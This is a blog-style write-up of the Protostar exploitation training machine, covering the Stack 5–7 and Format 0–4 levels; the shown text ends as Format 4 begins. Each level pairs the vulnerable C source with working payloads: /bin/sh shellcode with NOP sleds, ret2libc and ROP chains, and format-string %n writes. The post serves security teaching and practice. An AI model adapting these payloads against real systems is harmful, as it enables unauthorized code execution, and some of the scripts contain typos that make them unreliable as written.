@@ -1,0 +1,597 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    
+    <title>Protostar machine // B0YK4</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Mohamed Abd Elsattar" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://b0yk4.github.io/css/main.min.c69086131f3c165707b92a8a9f7bb02328e1aace76a4a1f205736e4987ea5363.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Protostar machine"/>
+<meta name="twitter:description" content="Stack 5 int main(int argc, char **argv) { char buffer[64]; gets(buffer); } just direct BOF we will overwite the return address of the main with the address of the beginning of our evel code which begins with nope slids and then the shellcode
+ the reason of using cat to serve our shell with stdi/o
+ $ (python -c &#39;import struct; BOF = 76*&#34;A&#34;; jmpaddr=struct.pack(&#34;I&#34;,0xbffff7f0); nope = 100*&#34;\x90&#34;; shell =&#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#34;; print BOF&#43;jmpaddr&#43;nope&#43;shell&#39;; cat) | ."/>
+
+    <meta property="og:title" content="Protostar machine" />
+<meta property="og:description" content="Stack 5 int main(int argc, char **argv) { char buffer[64]; gets(buffer); } just direct BOF we will overwite the return address of the main with the address of the beginning of our evel code which begins with nope slids and then the shellcode
+ the reason of using cat to serve our shell with stdi/o
+ $ (python -c &#39;import struct; BOF = 76*&#34;A&#34;; jmpaddr=struct.pack(&#34;I&#34;,0xbffff7f0); nope = 100*&#34;\x90&#34;; shell =&#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#34;; print BOF&#43;jmpaddr&#43;nope&#43;shell&#39;; cat) | ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b0yk4.github.io/posts/protostar/protostar/" />
+<meta property="article:published_time" content="2021-08-23T14:53:32+02:00" />
+<meta property="article:modified_time" content="2021-08-23T14:53:32+02:00" />
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+  </head>
+  <body>
+    
+    <header class="app-header">
+      <a href="https://b0yk4.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Mohamed Abd Elsattar" /></a>
+      <h1>B0YK4</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Cyber Security blog and CTFs writeups </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/b0yk4" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/mo-boyka/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/m0_boyka" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+<div class="app-new-header">
+  
+  
+  <h2><a  href="#" onclick="goBack()" > <i class="material-icons"  >arrow_back_ios_new</i>  </a> Protostar machine</h2>
+  
+  <hr >
+  </div>
+  
+    <main class="app-container">
+
+
+      
+  <article class="post">
+    <header class="post-header">
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 23, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://b0yk4.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://b0yk4.github.io/tags/machine/">machine</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="stack-5">Stack 5</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+
+  gets(buffer);
+}
+</code></pre></div><p>just direct BOF we will overwite the return address of the <code>main</code> with the address of the beginning of our evel code which begins with nope slids and then the shellcode</p>
+<blockquote>
+<p>the reason of using cat to serve our shell with stdi/o</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ <span style="color:#f92672">(</span>python -c <span style="color:#e6db74">&#39;import struct;
+</span><span style="color:#e6db74">BOF = 76*&#34;A&#34;;
+</span><span style="color:#e6db74">jmpaddr=struct.pack(&#34;I&#34;,0xbffff7f0);
+</span><span style="color:#e6db74">nope = 100*&#34;\x90&#34;; 
+</span><span style="color:#e6db74">shell =&#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#34;; 
+</span><span style="color:#e6db74">print BOF+jmpaddr+nope+shell&#39;</span>; cat<span style="color:#f92672">)</span> | ./stack5
+</code></pre></div><h2 id="stack-6">Stack 6</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getpath</span>()
+{
+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ret;
+
+  printf(<span style="color:#e6db74">&#34;input path please: &#34;</span>); fflush(stdout);
+
+  gets(buffer);
+
+  ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);
+
+  <span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xbf000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xbf000000</span>) {
+    printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
+    _exit(<span style="color:#ae81ff">1</span>);
+  }
+
+  printf(<span style="color:#e6db74">&#34;got path %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  getpath();
+}
+</code></pre></div><p>in this program it prevents us from jumping to any address in the stack as an example of non executable stack kanari, NX bit, DEP, ASLR&hellip; so we must jump to another addr out of the stack.</p>
+<h3 id="jmp-to-ret-again">jmp to ret again</h3>
+<p>the trick on this techinque is to jump to ret agin which means that the <code>0x080484f9 &lt;getpath+117&gt;:  ret</code> instruction will pop the top of the stack again to <code>EIP</code>
+the stack will looks like:
+| Stack          |
+| &mdash;&mdash;&mdash;&mdash;&ndash; |
+| &hellip;&hellip;&hellip;      |
+| 0x080484f9     |
+| evil code addr |
+| evil code      |
+| &hellip;&hellip;&hellip;      |</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> struct
+BOF <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;A&#34;</span>
+ret<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0x080484f9</span>)
+jmpaddr<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0xbffff7f0</span>)
+nope <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>;
+shell <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">print</span> BOF <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> jmpaddr <span style="color:#f92672">+</span> nope <span style="color:#f92672">+</span> shell
+</code></pre></div><h3 id="ret2libc">ret2libc</h3>
+<p>on this technique we will make our jmp addr the <code>system('/bin/sh')</code> function this built-in function in normal usage called with with one string argument the program instructions in normal case of call system() be like this :
+| stack                  |
+| &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;- |
+| &hellip;&hellip;&hellip;              |
+| ret addr from system() |
+| &lsquo;/bin/sh&rsquo;              |
+| &hellip;&hellip;&hellip;              |</p>
+<p>so we will make the stack looks like this but we need the addr of <code>system()</code> and an addr to the string<code>'/bin/sh'</code> and return addr dosent matter we don&rsquo;t need to return :)</p>
+<ul>
+<li>we can get the system addr from <code>libc</code> which standard library that linked to any executable binary and by using <code>$ ldd ./stack6</code> we can see the linked system libraries and by getting the addr of <code>/lib/libc.so.6 (0xb7e99000)</code></li>
+<li>by using <code>gdb&gt; print system</code> we can get the addr of system fun <code>{&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;</code></li>
+<li>by using command <code>$ strings -a -t x /lib/libc.so.6 |grep /bin/sh</code> we now have the offset with hex of the string <em>/bin/sh</em> in libc  <code>0x11f3bf:/bin/sh</code> by adding the offset to libc addr we now have the real address of the string in memory <code>'/bin/sh' addr = 0xb7e97000+0x11f3bf</code></li>
+<li><code>system addr = 0xb7ecffb0</code> , <code>'/bin/sh' addr = 0xb7e97000+0x11f3bf</code>time to write our magical exploit</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> struct
+BOF <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;A&#34;</span>
+system<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0xb7ecffb0</span>)
+system_ret<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;BBBB&#39;</span>
+bash<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0xb7e97000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x11f3bf</span>)
+<span style="color:#66d9ef">print</span> BOF <span style="color:#f92672">+</span> system <span style="color:#f92672">+</span> syetem_ret <span style="color:#f92672">+</span> bash
+</code></pre></div><h2 id="stack-7">Stack 7</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">getpath</span>()
+{
+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ret;
+
+  printf(<span style="color:#e6db74">&#34;input path please: &#34;</span>); fflush(stdout);
+
+  gets(buffer);
+
+  ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);
+
+  <span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xb0000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb0000000</span>) {
+      printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
+      _exit(<span style="color:#ae81ff">1</span>);
+  }
+
+  printf(<span style="color:#e6db74">&#34;got path %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
+  <span style="color:#66d9ef">return</span> strdup(buffer);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  getpath();
+}
+</code></pre></div><ul>
+<li>
+<h3 id="jmp-to-ret-again_">jmp to ret again_</h3>
+</li>
+</ul>
+<p>like stack6 we can solve stack7 with this technique</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> struct
+BOF <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;A&#34;</span>
+ret<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0x08048544</span>)
+jmpaddr<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0xbffff7f0</span>)
+nope <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>;
+shell <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">print</span> BOF <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> jmpaddr <span style="color:#f92672">+</span> nope <span style="color:#f92672">+</span> shell
+</code></pre></div><ul>
+<li>
+<h3 id="ret2text">ret2.text</h3>
+</li>
+</ul>
+<p>similar to ret2libc but here we cant ret2libc so we will use ROP gadgets used in .text we can find this by <code>msfelfscsn</code> or <code>ROBgadget</code>. imma use <code>ROBgadget</code> here
+1- first i need to copy <em>stack7</em> to my kali machine</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">~$ scp user@192.168.87.144:/opt/protostar/bin/stack7 /tmp/
+</code></pre></div><p>2- i need to find suitable ROP gadget with pop and ret to use</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/tmp$ ROPgadget --binary stack7
+...........
+0x08048493 : pop ebp ; ret
+0x08048381 : pop ebx ; leave ; ret
+0x08048492 : pop ebx ; pop ebp ; ret
+0x080485c5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x08048614 : pop ecx ; pop ebx ; leave ; ret
+0x080485c7 : pop edi ; pop ebp ; ret
+0x080485c6 : pop esi ; pop edi ; pop ebp ; ret
+..........
+</code></pre></div><p>imma use the simplest one <em>0x08048493 : pop ebp ; ret</em></p>
+<p>3- put the address of the gadget insted of ret address in the above solutions</p>
+<p>4- pop a demo from dem address let&rsquo;s say &lsquo;BBBB&rsquo;</p>
+<p>5- after that we can use ret2libc and excute <em>system()</em> as in stack6 or return to shellcode</p>
+<p>6- finally place the address of shellcode to return to it</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> struct
+BOF <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;A&#34;</span>
+ROPgadget<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0x08048493</span>) <span style="color:#75715e"># pop ret</span>
+pop<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;BBBB&#34;</span>
+ret<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,<span style="color:#ae81ff">0xbffff7f0</span>)
+nope <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>;
+shell <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">print</span> BOF <span style="color:#f92672">+</span>ROPgadget<span style="color:#f92672">+</span>pop<span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> nope <span style="color:#f92672">+</span> shell
+</code></pre></div><h2 id="format-0">format 0</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)
+{
+  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> target;
+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+
+  target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+  sprintf(buffer, string);
+  
+  <span style="color:#66d9ef">if</span>(target <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>) {
+      printf(<span style="color:#e6db74">&#34;you have hit the target correctly :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  }
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  vuln(argv[<span style="color:#ae81ff">1</span>]);
+}
+</code></pre></div><p><code>sprintf</code> doesn&rsquo;t validate the string length so we can easly cause BOF and overwrite the target with <em>0xdeadbeef</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ ./format0 <span style="color:#e6db74">`</span>python -c <span style="color:#e6db74">&#39;print &#34;\xef\xbe\xad\xde&#34;*17&#39;</span><span style="color:#e6db74">`</span>
+</code></pre></div><p>17*4 bytes = 64 buffer + 4 of target</p>
+<h2 id="format-1">format 1</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> target;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)
+{
+  printf(string);
+  
+  <span style="color:#66d9ef">if</span>(target) {
+      printf(<span style="color:#e6db74">&#34;you have modified the target :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  }
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  vuln(argv[<span style="color:#ae81ff">1</span>]);
+}
+</code></pre></div><p>get address of target = 0x08049638</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ objdump -t format1
+</code></pre></div><p>then passed it as block of your input and try to hit it with %x after finding suitable pattern of format input that hit the stored address that we passed and then replace %x of this position only with %n to overwrite the target with the length of our input</p>
+<blockquote>
+<p>note:
+make your target address between known pattern to easly find and recognize its position in the output.
+ex: <code>&quot;DDDD&quot;+ &quot;\x38\x96\x04\x08&quot; + &quot;DDDD&quot; + 168*&quot; %x&quot;</code>,
+the space before %x to make the output addresses separated and recognizable</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ ./format1 <span style="color:#e6db74">&#34;`python -c &#39;print &#34;</span><span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>96<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>08<span style="color:#e6db74">&#34;+126*&#34;</span>  %x<span style="color:#e6db74">&#34;+&#34;</span>  %n<span style="color:#e6db74">&#34;+&#34;</span>BBBB<span style="color:#e6db74">&#34;&#39;`&#34;</span>
+</code></pre></div><h2 id="format-2">Format 2</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> target;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
+{
+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>];
+
+  fgets(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+  printf(buffer);
+  
+  <span style="color:#66d9ef">if</span>(target <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>) {
+      printf(<span style="color:#e6db74">&#34;you have modified the target :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  } <span style="color:#66d9ef">else</span> {
+      printf(<span style="color:#e6db74">&#34;target is %d :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, target);
+  }
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  vuln();
+}
+</code></pre></div><p>if we try to enter sequence of alphabets as input and the %x%x%x%x%x%x:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ ./format2
+AAAABBBBCCCCDDDDEEEE%x%x%x%x%x
+AAAABBBBCCCCDDDDEEEE200b7fd8420bffff6144141414142424242
+target is <span style="color:#ae81ff">0</span> :<span style="color:#f92672">(</span>
+</code></pre></div><p>we&rsquo;ll find that these addresses values <em>200b7fd8420bffff614</em> alwayes printed before our input hex values in memory, like so:
+<code>AAAA &lt;200b7fd8420bffff614&gt; 41414141</code> so this sequence has <em>length=19</em>
+so we need input to be looks like this  <code>target_address + 41_byte + 3*&quot;%x&quot; + &quot;%n&quot;</code> = 64 byte length
+get address of target like in format1 = 0x080496e4</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ objdump -t format1
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ python -c <span style="color:#e6db74">&#39;print &#34;\xe4\x96\x04\x08&#34; + 41*&#34;A&#34; + 3*&#34;%x&#34; + &#34;%n&#34;&#39;</span>|./format2
+</code></pre></div><h2 id="format-3">Format 3</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> target;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printbuffer</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)
+{
+  printf(string);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
+{
+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>];
+
+  fgets(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+
+  printbuffer(buffer);
+  
+  <span style="color:#66d9ef">if</span>(target <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x01025544</span>) {
+      printf(<span style="color:#e6db74">&#34;you have modified the target :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  } <span style="color:#66d9ef">else</span> {
+      printf(<span style="color:#e6db74">&#34;target is %08x :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, target);
+  }
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  vuln();
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;print &#34;\xf4\x96\x04\x08&#34; + &#34;\xf6\x96\x04\x08&#34; + &#34;%21820d%12$hn&#34; + &#34;%43966d%13$hn&#34; &#39;</span> |./format3
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;print &#34;\xf4\x96\x04\x08&#34; + &#34;%16930112d%12$08n&#34; &#39;</span> |./format3
+</code></pre></div><h2 id="format-4">Format 4</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hello</span>()
+{
+  printf(<span style="color:#e6db74">&#34;code execution redirected! you win</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  _exit(<span style="color:#ae81ff">1</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
+{
